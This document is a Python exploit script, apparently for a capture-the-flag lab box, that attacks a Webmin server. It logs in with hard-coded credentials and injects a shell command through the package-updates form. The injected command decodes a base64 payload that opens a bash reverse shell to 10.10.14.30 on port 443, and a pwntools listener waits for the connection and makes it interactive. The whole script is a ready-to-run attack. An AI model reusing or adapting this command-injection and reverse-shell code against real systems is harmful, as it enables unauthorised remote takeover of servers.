#!/usr/bin/python3

from pwn import *
import urllib3
import requests
import pdb
import signal
import sys
import threading

# ctrl + c 
def def_handler(sig,frame):
	print("\n[!] Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://10.10.10.160:10000/session_login.cgi"
update_url = "https://10.10.10.160:10000/package-updates/update.cgi"

# Funciones
def makeRequest():

	urllib3.disable_warnings()
	s = requests.session()
	s.verify = False
	
	post_data = {
		"user" : "Matt",
		"pass" : "computer2008"
	}

	headers = {
		'Cookie' : 'redirect=1; testing=1; sid=x'
	}
	
	r = s.post(login_url, data=post_data, headers=headers)

	post_data = [('u', 'acl/apt'), ('u' , ' | bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMC80NDMgMD4mMQ== | base64 -d | bash"'), ('ok_top', 'Update Selected Packages')]
	headers = {'Referer': 'https://10.10.10.160:10000/package-updates/?xnavigation=1'}
	
	r = s.post(update_url, data=post_data, headers=headers)
	print(r.text)

if __name__ == "__main__":

    try:
    	threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(443, timeout=20).wait_for_connection()
    shell.interactive()
